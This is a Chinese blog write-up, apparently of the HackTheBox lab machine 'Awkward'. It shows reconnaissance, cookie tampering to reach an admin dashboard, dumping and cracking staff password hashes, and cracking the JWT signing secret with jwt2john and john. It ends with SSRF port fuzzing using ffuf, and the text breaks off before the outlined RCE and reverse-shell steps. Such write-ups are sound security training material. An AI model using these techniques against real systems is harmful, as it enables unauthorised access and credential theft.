<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="HackTheBox,Awkward">
    <meta name="description" content="HackTheBox-Awkward">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>HTB-Awkward | wa0er</title>
    <link rel="icon" type="image/png" href="/wa0er.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="wa0er" type="application/atom+xml">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>




<!-- åŠ è½½åŠ¨ç”» -->


<body>
    <!-- åŠ è½½åŠ¨ç”» -->
    

    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/wa0er.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">wa0er</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>é¦–é¡µ</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>æ ‡ç­¾</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>åˆ†ç±»</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>å½’æ¡£</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>å…³äº</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>å‹æƒ…é“¾æ¥</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="æœç´¢" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/wa0er.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">wa0er</div>
        <div class="logo-desc">
            
            Love and Share
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			é¦–é¡µ
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			æ ‡ç­¾
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			åˆ†ç±»
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			å½’æ¡£
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			å…³äº
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			å‹æƒ…é“¾æ¥
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/wa0er" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Follow Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/wa0er" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Follow Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('è¯·è¾“å…¥è®¿é—®æœ¬æ–‡ç« çš„å¯†ç ')).toString(CryptoJS.enc.Hex)) {
                alert('å¯†ç é”™è¯¯ï¼Œå°†è¿”å›ä¸»é¡µï¼');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/cover.png')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">HTB-Awkward</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- æ–‡ç« å†…å®¹è¯¦æƒ… -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/LFI/">
                                <span class="chip bg-color">LFI</span>
                            </a>
                        
                            <a href="/tags/Nginx/">
                                <span class="chip bg-color">Nginx</span>
                            </a>
                        
                            <a href="/tags/JWT%E4%BC%AA%E9%80%A0/">
                                <span class="chip bg-color">JWTä¼ªé€ </span>
                            </a>
                        
                            <a href="/tags/SSRF/">
                                <span class="chip bg-color">SSRF</span>
                            </a>
                        
                            <a href="/tags/awk%E5%91%BD%E4%BB%A4/">
                                <span class="chip bg-color">awkå‘½ä»¤</span>
                            </a>
                        
                            <a href="/tags/sed%E5%91%BD%E4%BB%A4RCE/">
                                <span class="chip bg-color">sedå‘½ä»¤RCE</span>
                            </a>
                        
                            <a href="/tags/mail%E5%91%BD%E4%BB%A4/">
                                <span class="chip bg-color">mailå‘½ä»¤</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
                                é¶æœº
                            </a>
                        
                            <a href="/categories/%E9%9D%B6%E6%9C%BA/HackTheBox/" class="post-category">
                                HackTheBox
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>å‘å¸ƒæ—¥æœŸ:&nbsp;&nbsp;
                    2023-03-11
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>æ›´æ–°æ—¥æœŸ:&nbsp;&nbsp;
                    2023-11-09
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>æ–‡ç« å­—æ•°:&nbsp;&nbsp;
                    4.8k&nbsp;å­—
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>é˜…è¯»æ—¶é•¿:&nbsp;&nbsp;
                    25 åˆ†
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>é˜…è¯»æ¬¡æ•°:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>&nbsp;æ¬¡
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- æ˜¯å¦åŠ è½½ä½¿ç”¨è‡ªå¸¦çš„ prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        
        <!-- ä»£ç å—æŠ˜è¡Œ -->
        <style type="text/css">
            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
        </style>
        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="HTB-Awkward"><a href="#HTB-Awkward" class="headerlink" title="HTB-Awkward"></a>HTB-Awkward</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><ol>
<li>ä¿¡æ¯æ”¶é›†å‘ç°JWTå’ŒSSRFï¼›</li>
<li>SSRFå‘ç°ç«™ç‚¹APIï¼›</li>
<li>å®¡è®¡APIæºç ï¼Œå‘ç°å¯ä¼ªé€ JWTæ‰§è¡Œawkå‘½ä»¤å®ç°LFIæ‹¿åˆ°beanç”¨æˆ·sshï¼›</li>
<li>è¿ä¸Šsshæ‰¾åˆ°è´­ç‰©è½¦æºç ï¼Œnginxæ•æ„Ÿæ–‡ä»¶æ³„éœ²æ‰¾åˆ°adminè´¦æˆ·ï¼›</li>
<li>å®¡è®¡è´­ç‰©è½¦æºç ï¼Œå‘ç°åˆ é™¤è´­ç‰©è½¦åŠŸèƒ½å¯åˆ©ç”¨sedå‘½ä»¤å®ç°RCEï¼›</li>
<li>RCEåå¼¹shellè·å–www-dataç”¨æˆ·æƒé™ï¼›</li>
<li>æ‰§è¡Œpspy64å‘ç°mailå‘½ä»¤åŠå…¶ç›®æ ‡æ–‡ä»¶leave_requests.csvï¼›</li>
<li>åˆ©ç”¨mailå‘½ä»¤å’Œleave_requests.csvåå¼¹shellè·å–rootæƒé™ã€‚</li>
</ol>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>Nmap</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/æ¡Œé¢]
â””â”€# nmap -sC -sV 10.10.11.185          
Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-16 21:53 EST
Nmap scan report for 10.10.11.185
Host is up (0.35s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:54:af:ba:f6:e2:83:59:41:b7:cd:61:1c:2f:41:8b (ECDSA)
|_  256 59:36:5b:ba:3c:78:21:e3:26:b3:7d:23:60:5a:ec:38 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.48 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¼€æ”¾ç«¯å£ï¼š22ï¼ˆSSHï¼‰ã€80ï¼ˆHTTPï¼‰</p>
<p>80ç«¯å£å¼€æ”¾ï¼Œç›´æ¥URLæ‰“å¼€IPï¼Œè·³è½¬åˆ°hat-valley.htbï¼Œé‚£å°±æ·»åŠ è¿›æœ¬åœ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">echo "10.10.11.185 hat-valley.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230217110323853.png"></p>
<p>ç›®å½•æ‰«æ</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">dirsearch -u http://hat-valley.htb/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230217111135831.png"></p>
<p>ç»§ç»­æ‰«jsç›®å½•</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">dirsearch -u http://hat-valley.htb/js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230217142128172.png"></p>
<p>app.jsæœhrefï¼Œå‘ç°å‡ ä¸ªå¯ç–‘ç›®å½•<code>/dashboard</code>ã€<code>/leave</code>ã€<code>/hr</code>ï¼Œä¾æ¬¡æ‰“å¼€ï¼Œå‘ç°å…¨éƒ¨éƒ½ä¼šè·³è½¬åˆ°<code>/hr</code>ï¼Œæ˜¯ä¸ªç™»å½•ç•Œé¢</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220101615666.png" style="zoom:67%;">

<p>éšä¾¿è¯•ï¼Œéƒ½ä¼šæŠ¥ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼Œç”¨BurpæŠ“åŒ…å‘ç°Cookieå­—æ®µæœ‰<code>token=guest</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220102134970.png" alt="image-20230220102134970"></p>
<p>burpç›´æ¥ä¿®æ”¹æˆ<code>token=admin</code>æˆ–è€…<code>token=administrator</code>ï¼Œé‡æ”¾è¯·æ±‚åŒ…ï¼Œè¿˜æ˜¯ä¸è¡Œ</p>
<p>ç”¨æ’ä»¶Cookie Editorç¼–è¾‘tokenå€¼ä¸ºadminï¼Œåˆ·æ–°é¡µé¢ï¼Œå‘ç°é¡µé¢è·³è½¬åˆ°<code>/dashboard</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220104116943.png"></p>
<p>æˆ–è€…ä¹Ÿå¯ä»¥æµè§ˆå™¨<code>F12</code>â†’<code>Storage</code>â†’<code>Cookies</code>ä¿®æ”¹ã€åˆ·æ–°é¡µé¢ï¼Œä¸€æ ·çš„æ•ˆæœ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220105152758.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220104309900.png"></p>
<p>æ‰“å¼€å·¦ä¾§èœå•æ ã€Leave Requestsã€‘é¡µé¢ï¼Œç•™æ„åˆ°æ‰€æœ‰çš„ç¦»å¼€è¯·æ±‚ä¼šç”±Christineå®¡æ ¸ï¼ŒçŒœæµ‹Christineåº”è¯¥æ˜¯ä¸ªæƒé™ä¸å°çš„è´¦æˆ·</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230221102637260.png"></p>
<p>ç„¶ååœ¨<code>F12</code>â†’<code>Network</code>â†’<code>XHR</code>ï¼ˆ<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/send">XMLHttpRequest</a>ï¼‰çœ‹åˆ°æœ‰ä¸¤ä¸ªapiæ–‡ä»¶</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220105826149.png"></p>
<p>åˆ†åˆ«è®¿é—®<code>http://hat-valley.htb/api/staff-details</code>å’Œ<code>http://hat-valley.htb/api/store-status</code>ï¼Œ<code>/api/store-status</code>é¡µé¢æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œ<code>/api/staff-details</code>æœ‰<code>jwt malformed</code>æŠ¥é”™ä¿¡æ¯</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220130856612.png"></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">JsonWebTokenError: jwt malformed
    at Object.module.exports [as verify] (/var/www/hat-valley.htb/node_modules/jsonwebtoken/verify.js:63:17)
    at /var/www/hat-valley.htb/server/server.js:151:30
    at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)
    at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)
    at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)
    at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)
    at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15
    at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12)
    at next (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:280:10)
    at cookieParser (/var/www/hat-valley.htb/node_modules/cookie-parser/index.js:71:5)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>jwt malformed</code>æŠ¥é”™æ˜¯å› ä¸ºå‰ç«¯ä¸Šä¼ tokençš„æ—¶å€™æ²¡æœ‰è¿›è¡Œéç©ºéªŒè¯ï¼Œå¯¼è‡´tokenä¼ ç»™äº†æœåŠ¡ç«¯ï¼Œè¿™æ ·å°±å’ŒæœåŠ¡ç«¯ç”Ÿæˆçš„tokené‡å¤äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬ç”¨CookieEditoræ’ä»¶æˆ–è€…F12åˆ é™¤cookieçš„tokenå­—æ®µï¼Œä¹Ÿå°±æ˜¯åˆ é™¤cookieï¼Œåˆ·æ–°é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°æœ‰å››ä¸ªç”¨æˆ·</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230221100317693.png"></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">username	"christine.wool"
password	"6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649"
username	"christopher.jones"
password	"e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1"
username	"jackson.lightheart"
password	"b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436"
username	"bean.hill"
password	"37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç›®æµ‹æ˜¯<code>64*4=256</code>ä½Hashï¼Œåœ¨çº¿è§£ä¸€ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230221101810630.png"></p>
<p>è§£å‡ºæ¥ä¸€ä¸ªç”¨æˆ·</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">christopher.jones
chris123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>é‚£ä¹ˆæˆ‘ä»¬é‡æ–°å›åˆ°<code>http://hat-valley.htb/hr</code>é¡µé¢ï¼Œç™»å½•è¿™ä¸ªè´¦æˆ·</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230221103219519.png"></p>
<p>çœ‹åˆ°<code>Staff Details</code>ï¼Œæœç„¶ï¼Œå‰é¢çš„åˆ¤æ–­æ²¡é”™ï¼ŒChristineæ˜¯CEOï¼Œæƒé™ä¸å°ï¼Œè¿˜æœ‰ä¸¤ä¸ªé”€å”®å’Œä¸€ä¸ªç³»ç»Ÿç®¡ç†å‘˜</p>
<p>å¹¶ä¸”æ‹¿åˆ°äº†JWT token</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303104140690.png"></p>
<p>ç”¨è„šæœ¬æŠŠè¿™ä¸ªJWT tokenè½¬æ¢æˆjohnæ ¼å¼ï¼Œç„¶åç”¨johnå·¥å…·ç ´è§£</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py">https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py</a></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&gt; python3 jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY3MDE3MTU3fQ.M5Yx5hMqtxf3hxrIJSjdLSdubkP6gFPtGzwsDDr7voI &gt; jwt_hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> sys
<span class="token keyword">from</span> jwt<span class="token punctuation">.</span>utils <span class="token keyword">import</span> base64url_decode
<span class="token keyword">from</span> binascii <span class="token keyword">import</span> hexlify


<span class="token keyword">def</span> <span class="token function">jwt2john</span><span class="token punctuation">(</span>jwt<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    Convert signature from base64 to hex, and separate it from the data by a #
    so that John can parse it.
    """</span>
    jwt_bytes <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span>
    parts <span class="token operator">=</span> jwt_bytes<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">)</span>

    data <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">b'.'</span> <span class="token operator">+</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    signature <span class="token operator">=</span> hexlify<span class="token punctuation">(</span>base64url_decode<span class="token punctuation">(</span>parts<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token punctuation">(</span>data <span class="token operator">+</span> <span class="token string">b'#'</span> <span class="token operator">+</span> signature<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Usage: %s JWT"</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        john <span class="token operator">=</span> jwt2john<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>john<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&gt; john -w=/usr/share/wordlists/rockyou.txt jwt_hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303115143339.png"></p>
<p>è·å–åˆ°JWT tokençš„secretå€¼ä¸º<code>123beany123</code>ï¼Œç”¨<code>JWT Debugger</code>å°è¯•ï¼Œæš‚æ—¶æ²¡å‘ç°ä»€ä¹ˆ</p>
<h2 id="ä¸‰ã€SSRF"><a href="#ä¸‰ã€SSRF" class="headerlink" title="ä¸‰ã€SSRF"></a>ä¸‰ã€SSRF</h2><p>æƒ³èµ·åˆšæ‰å‘ç°çš„å¦ä¸€ä¸ªAPIï¼Œ<code>api/store-status?url="http://store.hat-valley.htb"</code>ï¼Œå¯èƒ½å­˜åœ¨SSRF</p>
<p>å°è¯•<code>http://127.0.0.1:80</code>ï¼Œè¢«é‡å®šå‘åˆ°<code>http://store.hat-valley.htb</code>ï¼Œè¯å®å­˜åœ¨SSRF</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">http://hat-valley.htb/api/store-status?url="http://127.0.0.1:80"--&gt;http://store.hat-valley.htb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u 'http://hat-valley.htb/api/store-status?url="http://127.0.0.1:FUZZ"' -fs 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303133754827.png"></p>
<p>ä¸‰ä¸ªç«¯å£80ã€3002ã€8080</p>
